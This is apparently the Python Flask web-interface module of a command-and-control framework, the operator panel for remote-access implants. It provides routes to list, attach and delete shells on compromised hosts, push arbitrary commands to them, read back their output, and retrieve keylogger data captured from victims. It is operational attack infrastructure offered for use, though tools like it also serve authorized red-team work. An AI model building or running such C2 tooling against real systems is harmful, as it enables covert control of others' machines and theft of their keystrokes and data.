#!/usr/bin/python
# -*- coding: utf-8 -*-

import threading
import time
import os
from flask import redirect, url_for, request, render_template, jsonify
from flask_socketio import SocketIO
from core.ui import UI
from core.log import Log
from core.utils import Utils
from core.version import Version
from core.apis import FlaskFactory

errors = ['Wrong password', 'Session was destroyed']
version = Version.VERSION

app = FlaskFactory(__name__, root_path=os.getcwd(), template_folder=os.getcwd() + '/templates', static_path='/static')
websocket = SocketIO(app)

@app.route('/login/<int:error>', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'], defaults={'error': None})
def login(error):
    if request.method == 'POST':
        if app.post_login():
            return redirect(url_for('dashboard'))
        return redirect(url_for('login', error=1))
    
    if error:
        error = errors[error - 1]
    
    return render_template('login.html', error=error)

@app.route('/logout', methods=['GET'])
def logout():
    error = None
    if app.auth():
        app.logout()
        error = 2
    
    return redirect(url_for('login', error=error))

@app.route('/')
def index():
    if app.auth():
        return redirect(url_for('dashboard'))
    else:
        return redirect(url_for('login'))

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if app.auth():
        return render_template('dashboard.html', \
            username=app.get_user(), host=app.get_ip(), port=app.get_port(),
            protocol=app.get_protocol(), payloads_name=app.get_payloads_name(),)
    else:
        return redirect(url_for('login'))

# Fetch new events
@app.route('/api/newEvents', methods=['GET', 'POST'])
def new_events():
    if app.auth():
        return app.get_log_data(Log.get_current_date(), 'dashboard')
    else:
        return redirect(url_for('login'))

@websocket.on('msg-sent')
def push_msg(json):
    if app.auth():
        try:
            if json['username'] != '':
                if json['message'] != '':
                    websocket.emit('msg-received', json)
                    json['timestamp'] = Utils.timestamp()
                    app.send_msg(json)
                    
                    Log.log_chat(json['timestamp'], json['username'], json['message'])
        except:
            pass
    else:
        return redirect(url_for('login'))

# Fetch msgs
@app.route('/api/fetchMsgs', methods=['GET', 'POST'])
def fetch_msgs():
    if app.auth():
        return render_template('msgs.html', msgs=app.get_msgs())
    else:
        return redirect(url_for('login'))

# Fetch list of logs by dates
@app.route('/api/fetchLogs/<name>', methods=['GET', 'POST'])
def fetch_logs(name):
    if app.auth():
        return render_template('logs.html', output=False, dates=app.get_log_date(name), log_name=name.capitalize())
    else:
        return redirect(url_for('login'))

# Fetch specific Log
@app.route('/api/fetchLog/<date>/<name>', methods=['GET', 'POST'])
def fetch_log(date, name):
    if app.auth():
        name = name.lower()
        return render_template('logs.html', output=True, log_name=name.capitalize(), log_content=app.get_log_data(date, name))
    else:
        return redirect(url_for('login'))

# List all active shells
@app.route('/api/listShells', methods=['GET', 'POST'])
def list_shells():
    if app.auth():
        return render_template('shells.html', shells=app.get_shells(), uid=app.get_session_uid())
    else:
        return redirect(url_for('login'))

# Hook shell to user
@app.route('/api/attachShell/<uid>/<id>', methods=['GET', 'POST'])
def attach_shell(uid, id):
    if app.auth():
        app.hook_shell(uid, id)
        return render_template("shell-box.html", id=id, username=app.get_username(), uid=app.get_session_uid(),
                                domain=app.get_shell_domain(id), hostname=app.get_shell_hostname(id), user=app.get_shell_user(id))
    else:
        return redirect(url_for('login'))

# Unhook shell from user
@app.route('/api/detachShell/<uid>/<id>', methods=['GET', 'POST'])
def detach_shell(uid, id):
    if app.auth():
        app.unhook_shell(uid, id)
        return ""
    else:
        return redirect(url_for('login'))


# Send cmd to shell
@app.route('/api/pushCmd/<id>', methods=['GET', 'POST'])
def push_cmd(id):
    if app.auth():
        data = request.json
        username = data['user']
        cmd = data['cmd']
        if username == app.get_username():
            app.send_cmd(id, cmd, username)
            return ""
        else:
            return ""
    else:
        return redirect(url_for('login'))

# Fetch shell cmd output
@app.route('/api/fetchOutput/<id>', methods=['GET', 'POST'])
def fetch_output(id):
    if app.auth():
        data = app.get_output(id)
        if len(data) == 0:
            return '__no_output__'
        else:
            output = '<b>[%s] Received Output:</b>\n%s' % (Utils.timestamp(), app.html_escape(data))
            return output
    else:
        return redirect(url_for('login'))

# Fetch shell cmd output
@app.route('/api/fetchInput/<id>', methods=['GET', 'POST'])
def fetch_input(id):
    if app.auth():
        data = app.get_input(id)
        if len(data) == 0:
            return '__no_output__'
        else:
            output = '<b>[%s] %s</b>\n' % (Utils.timestamp(),app.html_escape(data))
            return output
    else:
        return redirect(url_for('login'))

# Fetch keylogger data from shell
@app.route('/api/fetchKeylogger/<id>', methods=['GET', 'POST'])
def fetch_keylogger(id):
    if app.auth():
        return app.get_keylogger_data(id)
    else:
        return redirect(url_for('login'))

# Fetch shell data from shell
@app.route('/api/fetchShellLog/<id>', methods=['GET', 'POST'])
def fetch_shell_log(id):
    if app.auth():
        return app.get_shell_data(id)
    else:
        return redirect(url_for('login'))

@app.route('/api/deleteShell/<id>', methods=['POST'])
def remove_shell(id):
    if app.auth():
        data = request.json
        username = data['user']
        if username == app.get_username():
            app.delete_shell(id, username)
            return ""
        else:
            return ""
    else:
        return redirect(url_for('login'))

def init_gui_thread(config, cli):
    thread = threading.Thread(target=start_gui, args=(config, cli, ))
    thread.start()
    return thread

def start_gui(config, cli):
    prefix = "http://"
    
    try:
        port =  int(config.get("gui-port"))   
    except:
        UI.error("(gui-port) GUI HTTP port need to be a integer.", True)
    
    if config.get("https-enabled") == "on":
            prefix = "https://"
            
    UI.warn('Web GUI Started: %s%s:%s' % (prefix, config.get('gui-host'), config.get('gui-port')))
    UI.warn('Web GUI Password: %s\n\n' % config.get('server-password'))
            
    app.init(config, cli)
    path = "%s/logs/%s" % (os.getcwd(), str(time.strftime("%d-%m-%Y")))
    gui_log = "%s/gui.log" % path
    
    if not os.path.exists(path):
        os.makedirs(path)
        
    fd = os.open(gui_log, "a+")
    stderr = 2
    websocket.run(app, host=config.get("gui-host"), port=port, log_output=os.dup2(fd, stderr))